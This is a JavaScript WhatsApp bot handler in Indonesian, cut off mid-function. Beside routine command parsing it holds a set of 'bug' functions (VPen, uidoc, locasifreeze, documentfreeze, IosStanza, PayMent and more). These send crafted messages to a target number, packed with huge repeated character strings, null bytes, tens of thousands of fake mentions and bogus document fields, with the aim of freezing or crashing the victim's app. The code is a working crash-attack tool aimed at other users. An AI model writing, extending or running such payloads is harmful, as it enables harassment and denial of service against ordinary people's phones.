module.exports = async (dikabot, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await dikabot.decodeJid(dikabot.user.id)
const sender = m.key.fromMe ? (dikabot.user.id.split(':')[0]+'@s.whatsapp.net' || dikabot.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await dikabot.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const brutality = fs.readFileSync(`./all/image/brutality.jpg`)
const dikaganteng = fs.readFileSync(`./all/image/dikaganteng.jpg`)
const dikajembut = fs.readFileSync(`./all/image/dikajembut.jpg`) 
const zkosong = fs.readFileSync(`./all/image/zkosong.png`)

// VIRTEX
		const {
			ios
		} = require("./all/virtex/ios.js")
		const {
			telapreta3
		} = require("./all/virtex/telapreta3.js")
		const {
			convite
		} = require("./all/virtex/convite.js")
		const {
			bugpdf
		} = require("./all/virtex/bugpdf.js")
		const {
			cP
		} = require('./all/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return dikabot.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan Dik!'), color(`[#]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat *Malam*'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat *Petang*'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat *Sore*'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat *Siang*'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat *Pagi*'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat *Subuh*'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat *Tengah Malam*'
        }
      

// Read Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   dikabot.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: dikabot.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.ownername,
      body: `Dika ID`,
      thumbnailUrl: 'https://i.ibb.co.com/gRN9pRX/brutality.jpg',
      sourceUrl: 'https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await dikabot.sendPresenceUpdate('composing', jid)
      return dikabot.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await dikabot.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await dikabot.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			dikabot.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

// The Bug Functions ! //
 // Ui Speciality //
 async function VPen(zLoc, ptcp = false) {
    let valhalla = "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let battanz = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Gateway To Hell"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: valhalla 
                        }]
                    }
                }
            }
        }
    };

    await dikabot.relayMessage(zLoc, battanz, { participant: { jid: zLoc } }, { messageId: null });
}
		async function TanggapanDiterima(zLoc, Ptcp = true) {
			await dikabot.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
		};
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "@0".repeat(109999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " 💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze(zLoc, ptcp = false) {
    let uitext = "DikaDocu" + "*~@1~*".repeat(50000);
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "flower",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" +  "꧀ *~@1~*".repeat(50000);
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~DIKATHEGENKZ~" + "ꦿꦾ".repeat(50000);
    await dikabot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " X 🚀 ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function liveLokFreeze(zLoc, ptcp = false) {
        let virtex = "ꪶ𖣂ꫂ x💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮 厷"+"ꦾ".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": virtex,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: virtex
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await dikabot.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
}

// Ios Speciality //
	async function IosPayM(zLoc, ptcp = false) {
			dikabot.relayMessage(zLoc, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			});
		};
		
				async function IosStanza(zLoc, ptcp = false) {
			dikabot.relayMessage(zLoc, {
				'extendedTextMessage': {
					'text': 'DIKATHEGENKZ' + 'ꦾ'.repeat(35000),
					'contextInfo': {
						'stanzaId': zLoc,
						'participant': zLoc,
						'quotedMessage': {
							'conversation': '🌷 💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': zLoc
				}
			}, {
				'messageId': null
			});
		};
		
				async function IosCL(zLoc, ptcp = false) {
			await dikabot.relayMessage(zLoc, {
					"extendedTextMessage": {
						"text": "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮 ",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮 Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
